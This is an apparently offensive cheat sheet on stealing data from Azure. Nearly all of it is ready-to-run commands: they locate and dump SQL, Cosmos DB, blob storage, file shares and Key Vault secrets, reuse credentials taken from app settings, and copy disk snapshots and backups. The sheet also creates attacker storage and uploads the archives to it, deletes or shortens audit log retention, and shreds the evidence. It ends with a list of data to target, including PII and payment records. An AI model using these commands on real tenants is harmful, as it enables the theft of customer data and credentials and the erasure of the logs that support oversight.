# Azure Data Exfiltration

Techniques for locating, accessing, and exfiltrating sensitive data from Azure environments.

## Data Discovery

### Identify Sensitive Data Locations

```bash
# Search for databases with sensitive naming
az sql server list --query '[].name' -o tsv | while read server; do
  az sql db list --server $server --query '[].name' -o tsv | grep -i "prod\|customer\|patient\|financial"
done

# Find storage accounts with sensitive naming
az storage account list --query '[].name' -o tsv | grep -i "backup\|archive\|data\|sensitive"

# Enumerate blob containers
for account in $(az storage account list --query '[].name' -o tsv); do
  echo "=== Account: $account ==="
  az storage container list --account-name $account --output table 2>/dev/null
done

# Find Key Vaults with database credentials
az keyvault list --query '[].name' -o tsv | while read vault; do
  az keyvault secret list --vault-name $vault --query '[].name' -o tsv
done
```

### Search Storage for Sensitive Content

```bash
# Look for files containing sensitive data patterns
az storage blob list --container-name {container} --account-name {account} --output json | \
  jq '.[] | select(.name | test("backup|export|dump|database|customer|pii|ssn|credit"))'

# Find files with sensitive extensions
az storage blob list --container-name {container} --account-name {account} --output json | \
  jq '.[] | select(.name | test("\\.bak$|\\.sql$|\\.xlsx$|\\.csv$|\\.json$"))'

# Check modification times to find recent exports
az storage blob list --container-name {container} --account-name {account} --output json | \
  jq '.[] | select(.properties.lastModified | fromdateiso8601 > now - 86400) | {name, lastModified}'
```

## Database Exfiltration

### SQL Database Export

```bash
# Create database backup
az sql db export \
  --name {dbName} \
  --server {serverName} \
  --resource-group {rg} \
  --admin-login {user} \
  --admin-password {password} \
  --storage-key-type StorageAccessKey \
  --storage-key {accountKey} \
  --storage-uri "https://{account}.blob.core.windows.net/{container}/"

# Wait for export to complete
while [ $(az sql db export show --name {exportName}) == "InProgress" ]; do
  sleep 10
done

# Download exported file
az storage blob download \
  --name {exportedFile} \
  --container-name {container} \
  --account-name {account} \
  --file database-backup.bacpac
```

### SQL Database Direct Query & Export

```bash
# Query database directly
sqlcmd -S {server}.database.windows.net -d {database} \
  -U {user} -P {password} \
  -Q "SELECT * FROM sensitive_table" > data.txt

# Export query results to CSV
sqlcmd -S {server}.database.windows.net -d {database} \
  -U {user} -P {password} \
  -Q "SELECT * FROM customers" -h -1 -s "," > customers.csv

# BCP bulk export (faster for large data)
bcp {database}.dbo.customers out customers.bcp -S {server}.database.windows.net \
  -U {user} -P {password} -N

# Convert BCP to CSV
bcp {database}.dbo.customers format nul -S {server}.database.windows.net \
  -U {user} -P {password} -f format.fmt -N
```

### Cosmos DB Export

```bash
# Get Cosmos DB account key
COSMOS_KEY=$(az cosmosdb keys list --name {accountName} \
  --resource-group {rg} --query 'primaryMasterKey' -o tsv)

# Export all data via Azure Data Factory (if accessible)
# Or direct query via SDK

# Export via MongoDB if using MongoDB API
mongodump --uri "mongodb://{accountName}:{COSMOS_KEY}@{accountName}.mongo.cosmos.azure.com:10255/?retryWrites=false" \
  --out ./cosmos-backup

# Export via query API
curl -s -X GET https://{accountName}.documents.azure.com/dbs/{dbId}/colls/{collId}/docs \
  -H "Authorization: Bearer $TOKEN" | jq '.' > cosmos-data.json
```

## Storage Account Data Exfiltration

### Blob Storage Bulk Download

```bash
# Download entire container
az storage blob download-batch \
  --source {containerName} \
  --destination ./downloaded_data \
  --account-name {accountName} \
  --pattern "*" \
  --no-progress

# Download with filtering
az storage blob download-batch \
  --source {containerName} \
  --destination ./sensitive \
  --account-name {accountName} \
  --pattern "*/customer*" \
  --no-progress

# Download with parallel execution
az storage blob download-batch \
  --source {containerName} \
  --destination ./data \
  --account-name {accountName} \
  --max-connections 20
```

### Azure Files (SMB Share) Extraction

```bash
# Mount file share
net use Z: \\{account}.file.core.windows.net\{shareName} /u:{user} {password}

# Copy all files
robocopy Z: C:\local-copy /E /R:0

# Or use azcopy
azcopy copy "https://{account}.file.core.windows.net/{share}" "./local-path" --recursive

# Archive for transfer
tar -czf files-backup.tar.gz C:\local-copy
```

## Application Data Extraction

### App Service Database Access

```bash
# Get connection strings from app settings
az webapp config appsettings list --name {app} --resource-group {rg} | \
  jq '.[] | select(.name | test("DATABASE|CONNECTION|SQL")) | {name, value}'

# Extract and use connection string
CONN_STR=$(az webapp config appsettings list --name {app} --resource-group {rg} | \
  jq -r '.[] | select(.name=="DatabaseConnection") | .value')

# Parse connection string
Server=$(echo $CONN_STR | grep -oP 'Server=\K[^;]+')
Database=$(echo $CONN_STR | grep -oP 'Database=\K[^;]+')
User=$(echo $CONN_STR | grep -oP 'User ID=\K[^;]+')
Password=$(echo $CONN_STR | grep -oP 'Password=\K[^;]+')

# Connect and export
sqlcmd -S $Server -d $Database -U $User -P $Password \
  -Q "SELECT * FROM sensitive_table" > table-export.csv
```

### Function App Secrets Extraction

```bash
# Get function app configuration
az functionapp config appsettings list --name {function} --resource-group {rg} | \
  jq '.[] | {name, value}' > function-config.json

# Extract database credentials
grep -i "password\|key\|secret" function-config.json

# Use extracted credentials
cat function-config.json | jq -r '.[] | select(.name=="DBPassword") | .value'
```

## Key Vault Data Exfiltration

### Extract All Secrets

```bash
# List all secrets
SECRETS=$(az keyvault secret list --vault-name {vault} --query '[].name' -o tsv)

# Extract each secret
for secret in $SECRETS; do
  echo "=== $secret ==="
  az keyvault secret show --vault-name {vault} --name "$secret" --query 'value' -o tsv
done > all-secrets.txt

# Extract in JSON format
az keyvault secret list --vault-name {vault} --output json | \
  while IFS= read -r secret_name; do
    az keyvault secret show --vault-name {vault} --name "$secret_name" --output json
  done > secrets-full.json

# Extract certificates
for cert in $(az keyvault certificate list --vault-name {vault} --query '[].name' -o tsv); do
  az keyvault certificate download --vault-name {vault} --name "$cert" --file "$cert.pfx"
done
```

### Credential Reuse from Key Vault

```bash
# Database credentials from Key Vault
DB_USER=$(az keyvault secret show --vault-name {vault} --name "DatabaseUser" --query 'value' -o tsv)
DB_PASS=$(az keyvault secret show --vault-name {vault} --name "DatabasePassword" --query 'value' -o tsv)
DB_SERVER=$(az keyvault secret show --vault-name {vault} --name "DatabaseServer" --query 'value' -o tsv)

# Access database with extracted credentials
sqlcmd -S $DB_SERVER -U $DB_USER -P $DB_PASS -d master \
  -Q "SELECT * FROM sys.databases" > databases.txt

# API keys and credentials
API_KEY=$(az keyvault secret show --vault-name {vault} --name "ThirdPartyAPIKey" --query 'value' -o tsv)

# Use API key to access external systems
curl -s -H "Authorization: Bearer $API_KEY" https://api.thirdparty.com/data > api-data.json
```

## Backup & Snapshot Exfiltration

### VM Snapshot Access

```bash
# Create snapshot of managed disk
az snapshot create --name disk-snapshot \
  --resource-group {rg} \
  --source {diskId}

# Export snapshot
SNAPSHOT_ID=$(az snapshot show --name disk-snapshot --resource-group {rg} --query 'id' -o tsv)

az snapshot grant-access --name disk-snapshot --resource-group {rg} \
  --duration-in-seconds 3600 --query 'accessSas' -o tsv > snapshot-url.txt

# Download snapshot
SNAPSHOT_URL=$(cat snapshot-url.txt)
azcopy copy "$SNAPSHOT_URL" "./disk-image.vhd"

# Mount and extract from snapshot
# Use VHD mount tools to access data
```

### Database Backup Access

```bash
# List database backups
az sql db list-backups --server {server} --database {db} --resource-group {rg}

# Restore backup to new database
az sql db restore --dest-name restored-db \
  --server {server} --resource-group {rg} \
  --backup-id {backupId}

# Access restored database
sqlcmd -S {server}.database.windows.net -d restored-db \
  -U {user} -P {password} \
  -Q "SELECT * FROM sensitive_table" > restored-data.csv

# Clean up
az sql db delete --name restored-db --server {server} --resource-group {rg} --yes
```

## Exfiltration Path Setup

### Create Attacker-Controlled Storage

```bash
# Create storage account for receiving data
az storage account create --name exfil{random} --resource-group {rg}

# Get account key for connection
EXFIL_KEY=$(az storage account keys list --account-name exfil{random} \
  --resource-group {rg} --query '[0].value' -o tsv)

# Create container
az storage container create --name data --account-name exfil{random}

# Generate SAS URL for external access
EXFIL_SAS=$(az storage container generate-sas \
  --account-name exfil{random} \
  --name data \
  --account-key $EXFIL_KEY \
  --permissions racwd \
  --expiry $(date -d '+30 days' '+%Y-%m-%dT%H:%MZ') --output tsv)

# Full exfiltration URL
echo "https://exfil{random}.blob.core.windows.net/data?$EXFIL_SAS"
```

### Upload Extracted Data

```bash
# Upload to attacker storage
az storage blob upload-batch \
  --source ./sensitive-data \
  --destination data \
  --account-name exfil{random} \
  --account-key $EXFIL_KEY \
  --no-progress

# Verify upload
az storage blob list --container-name data \
  --account-name exfil{random} \
  --account-key $EXFIL_KEY

# Compress before upload for faster transfer
tar -czf sensitive-data.tar.gz ./sensitive-data
az storage blob upload --name sensitive-data.tar.gz \
  --container-name data \
  --account-name exfil{random} \
  --account-key $EXFIL_KEY \
  --file sensitive-data.tar.gz
```

## Detection Evasion

```bash
# Monitor for suspicious activity detection
az monitor activity-log list --resource-group {rg} | jq '.[] | {EventTimestamp, OperationName, Caller}'

# Bulk operations trigger alerts
# Spread exfiltration over time
# Use legitimate backup/export features when possible

# Clean up audit logs if possible
az monitor log-profiles delete --name default

# Or reduce retention
az monitor log-profiles update --name default --retention-policy enabled --retention-days 1

# Use existing network paths (legitimate traffic)
# Don't create obvious attacker infrastructure
```

## Data Staging

```bash
# Create temporary workspace within environment
mkdir /tmp/exfil-workspace
cd /tmp/exfil-workspace

# Download all data locally first
az storage blob download-batch --source {container} --destination .

# Compress for transfer
tar -czf final-exfil.tar.gz *

# Verify contents before exfil
tar -tzf final-exfil.tar.gz | head -20

# Final upload to external location
azcopy copy final-exfil.tar.gz \
  "https://{external-storage}.blob.core.windows.net/{container}/"

# Clean up evidence
shred -vfz -n 10 final-exfil.tar.gz
```

## Key Data to Target

- Customer databases (PII, payment info)
- Employee records (salaries, personal info)
- Source code repositories
- API keys and credentials
- Encryption keys
- Configuration files
- Backup files
- Database dumps
- Email archives
- Document repositories
- Financial records
- Intellectual property
